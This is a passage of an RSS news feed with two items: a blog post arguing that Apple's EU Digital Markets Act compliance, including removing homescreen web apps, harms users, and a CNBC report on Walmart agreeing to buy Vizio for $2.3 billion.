<div id="readability-page-1" class="page"><div itemprop="articleBody">
<p>The <a href="https://digital-markets-act.ec.europa.eu/about-dma_en">European Union’s Digital Markets Act</a> is being enforced and <a href="https://developer.apple.com/support/dma-and-apps-in-the-eu/">Apple aren’t happy about it</a>.</p>

<p>Most of the discussion around this topic has centred on the requirement for Apple to provision alternative app stores. I don’t really care about that because I don’t really care about native apps. With one exception: I care about web browsers.</p>

<p>That’s the other part of the DMA that’s being enforced: Apple <em>finally</em> have to allow alternative browsing engines. Hallelujah!</p>

<p>Instead of graciously acknowledging that this is what’s best for users, <a href="https://open-web-advocacy.org/blog/owa-review-apple-dma-compliance-for-web/">Apple are throwing a tantrum</a>.</p>

<p>First of all, they’re going to ringfence any compliance to users in the European Union. Expect some very interesting edge cases to emerge in a world where people don’t spent their entire lives in one country.</p>

<p>Secondly, Apple keep insisting that this will be very, very bad for security. You can read <a href="https://www.apple.com/newsroom/2024/01/apple-announces-changes-to-ios-safari-and-the-app-store-in-the-european-union/">Apple’s announcement on being forced to comply</a> but as you do you so, I’d like you to remember one thing: every nightmare scenario they describe for <a href="https://developer.apple.com/support/dma-and-apps-in-the-eu#ios-app-eu">the security of users in the EU</a> is exactly what currently happens on Macs everywhere in the world.</p>

<blockquote>
  <p>This includes risks from installing software from unknown developers that are not subject to the Apple Developer Program requirements, installing software that compromises system integrity with malware or other malicious code, the distribution of pirated software, exposure to illicit, objectionable, and harmful content due to lower content and moderation standards, and increased risks of scams, fraud, and abuse.</p>
</blockquote>

<p>Users of macOS everywhere are currently exposed to all the risks that will supposedly overwhelm iOS users in the European Union. Weirdly, the sky hasn’t fallen.</p>

<p>It’s the same with web browsers. I just got a new Mac. It came with one browser pre-installed: Safari. It’s a good browser. But I also have the option of installing another browser, like Firefox (which I’ve done). A lot of people just use Safari. That’s good. That’s choice. Everyone wins.</p>

<p>Now Apple need to provide parity on iOS, at least for users in the EU. Again, Apple are decribing this coming scenario as an absolute security nightmare. But again, the conditions they’re describing are what <em>already exist</em> on macOS.</p>

<p>All Apple is being asked to do is offer than the same level of choice on mobile that everyone already enjoys on their computers. Rather than comply reasonably, <a href="https://bugs.webkit.org/show_bug.cgi?id=268643">Apple have found a way to throw their toys out of the pram</a>.</p>

<p>As of the next update to iOS, <a href="https://developer.apple.com/support/dma-and-apps-in-the-eu#8">users in the EU will no longer have homescreen apps</a>. Those web apps will now launch in a browser window. Presumably they’ll also lose the ability to send <a href="https://adactio.com/journal/19911">push notifications</a>: being a homescreen app was a prerequisite for that functionality.</p>

<p>This is a huge regression that only serves to harm and confuse users.</p>

<p>I have <a href="https://thesession.org/">a website about traditional Irish music</a>. Guess where a significant amount of the audience is based? That’s right: Ireland. In the European Union.</p>

<p>There is no native app for The Session, but <a href="https://thesession.org/app">you can install it on your phone nonetheless</a>. Lots of people have done that. After a while they forget that they didn’t install it from an app store: it behaves just like any other app on their homescreen.</p>

<p>That’s all about to change. I’m going to get a lot of emails from confused users wondering why their app is broken, now opening in a regular browser window. And I won’t be able to do anything about it, other than to tell them to take it up with Apple.</p>

<p>Presumably Apple is hoping that users will direct their anger at the EU commission instead. They’re doing their best to claim that they’re being forced to make this change. That’s completely untrue. <a href="https://open-web-advocacy.org/blog/its-official-apple-kills-web-apps-in-the-eu/">A lie</a>:</p>

<blockquote>
  <p>This is emphatically not required by the EU’s Digital Markets Act (DMA). It’s a circumvention of both the spirit and the letter of the Act, and if the EU allows it, then the DMA will have failed in its aim to allow fair and effective browser and web app competition.</p>
</blockquote>

<p>Throughout all their communications on this topic, Apple are sticking to their abuser logic:</p>

<blockquote>
  <p>Look what you made me do!</p>

  <p>This is going to hurt me more than it hurts you.</p>
</blockquote>

<p>Apple’s petulant policy of malicious compliance is extremely maddening. What they’re about to do to users in the EU is just nasty.</p>

<p>This is a very dark time for the web.</p>

<p>I feel bad for the Safari team. They’ve been working really hard recently to make Safari a very competitive browser with great standards support with a quicker release cycle than we’ve seen before. Then it all gets completely torpedoed at the level of the operating system.</p>

<p>I really hope that Apple won’t get away with their plan to burn down web apps on iOS in the EU. But hope isn’t enough. We need to tell the EU commission how much damage this will do.</p>

<p>If you’ve ever built a web app, then your users will suffer. Remember, it’s a <em>world wide</em> web, including the European Union.</p>

<p>Create a PDF with the following information:</p>

<ul>
<li>Your company’s name.</li>
<li>Your name.</li>
<li>That your company operates or services the EU.</li>
<li>How many users your service has in the EU&nbsp;(approximately).</li>
<li>The level of impact this will have on your business.</li>
<li>The problems this will cause your business.</li>
<li>Whether or not the submission is confidential.</li>
</ul>

<p>The submission can be as short or long as you want. Send it to <a href="mailto:contactus@open-web-advocacy.org">contactus@open-web-advocacy.org</a>, ideally before Monday, February 19th.</p>

<p>I know that’s a lot to ask of you on your weekend, but this really matters for the future of the web.</p>

<p>At the very least, I encourage to get involved with the great work being done by the <a href="https://open-web-advocacy.org/">Open Web Advocacy</a> group. <a href="https://discord.gg/x53hkqrRKx">They’re also on Discord</a>.</p>

<p>Please don’t let Apple bully an entire continent of users.</p>

</div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Walmart to buy TV maker Vizio for $2.3B (114 pts)]]></title>
            <link>https://www.cnbc.com/2024/02/20/walmart-agrees-to-buy-vizio-to-grow-ad-business.html</link>
            <guid>39440354</guid>
            <pubDate>Tue, 20 Feb 2024 12:16:47 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.cnbc.com/2024/02/20/walmart-agrees-to-buy-vizio-to-grow-ad-business.html">https://www.cnbc.com/2024/02/20/walmart-agrees-to-buy-vizio-to-grow-ad-business.html</a>, See on <a href="https://news.ycombinator.com/item?id=39440354">Hacker News</a></p>
<div id="readability-page-1" class="page"><div id="RegularArticle-ArticleBody-5" data-module="ArticleBody" data-test="articleBody-2" data-analytics="RegularArticle-articleBody-5-2"><div id="ArticleBody-InlineImage-107375792" data-test="InlineImage"><p>A customer stands near Vizio televisions on display in a Walmart Supercenter on February 20, 2024 in Hallandale Beach, Florida.&nbsp;</p><p>Joe Raedle | Getty Images</p></div><div><p><span data-test="QuoteInBody" id="RegularArticle-QuoteInBody-1"><a href="https://www.cnbc.com/quotes/WMT/">Walmart</a><span><span id="-WatchlistDropdown" data-analytics-id="-WatchlistDropdown"></span></span></span> has agreed to buy TV maker <span data-test="QuoteInBody" id="RegularArticle-QuoteInBody-2"><a href="https://www.cnbc.com/quotes/undefined/">Vizio</a><span><span id="-WatchlistDropdown" data-analytics-id="-WatchlistDropdown"></span></span></span>, the companies announced Tuesday, as the largest U.S. retailer <a href="https://www.cnbc.com/2023/08/01/walmart-pushes-into-in-stores-advertising-as-new-revenue-driver.html">grows its high-profit ad business</a>.</p><p>Walmart will acquire Vizio for $2.3 billion, or $11.50 per share, in cash. The big-box retailer announced the acquisition as it <a href="https://www.cnbc.com/2024/02/20/walmart-wmt-q4-2024-earnings-.html">reported its fourth-quarter earnings</a>.</p><p>Vizio shares, which spiked after reports of the deal first emerged last week, closed at $9.53 on Friday. They jumped 15% during early trading Tuesday.</p><p>Walmart and its Sam's Club warehouse chain have long been major sellers of Vizio devices. But in buying the company, Walmart touted the potential to boost its ad business through Vizio's SmartCast Operating System, which allows users to stream free ad-supported content on their TVs.</p><p>As it pushes for higher profits, the retail titan has tried to expand its media business Walmart Connect, which comes with bigger profit margins than selling groceries or clothing. The segment's advertising sales grew 22% in the fourth quarter.</p><p>"We believe VIZIO's customer-centric operating system provides great viewing experiences at attractive price points. We also believe it enables a profitable advertising business that is rapidly scaling," said Seth Dallaire, executive vice president and chief revenue officer of Walmart U.S., in a statement.</p><p>The move comes as Walmart tries to compete with Amazon's growing ad segment.</p><p>Walmart's control of the Vizio platform will give companies that advertise with the retailer a greater reach. In a news release, Walmart said Vizio's SmartCast system has 18 million active accounts.</p><div><p>The retailer also said it could offer "innovative television and in-home entertainment and media experiences" after it acquires the TV maker.</p><p><em><strong>Don't miss these stories from CNBC PRO:</strong></em></p></div><ul><li><a href="https://www.cnbc.com/2024/02/18/buffetts-berkshire-keeps-new-stock-pick-secret-again-what-it-means.html"><em>Warren Buffett's Berkshire keeps new stock pick secret — again. Here's what it means</em></a></li><li><a href="https://www.cnbc.com/2024/02/14/michael-burry-of-the-big-short-fame-buys-amazon-alphabet-and-a-dozen-of-other-new-stocks.html"><em>Michael Burry of 'The Big Short' fame buys Amazon, Alphabet and a dozen other new stocks</em></a></li><li><a href="https://www.cnbc.com/2024/02/15/move-over-nvidia-a-new-hot-ai-play-has-soared-950percent-in-the-past-year.html"><em>Move over, Nvidia. There's a new hot AI play that has soared 960% in the past year</em></a></li><li><a href="https://www.cnbc.com/2024/02/19/morgan-stanleys-andrew-slimmon-shares-stock-picks-a-good-year-for-equities.html"><em>Morgan Stanley's Slimmon names 3 stocks to buy right now: 'It's going to be a good year for equities'</em></a></li><li><a href="https://www.cnbc.com/2024/02/16/you-wont-believe-the-bank-thats-offering-one-of-the-highest-cd-rates.html"><em>This little-known bank is offering one of the highest CD rates</em></a></li></ul></div></div></div>]]></description>
        </item>
    </channel>
</rss>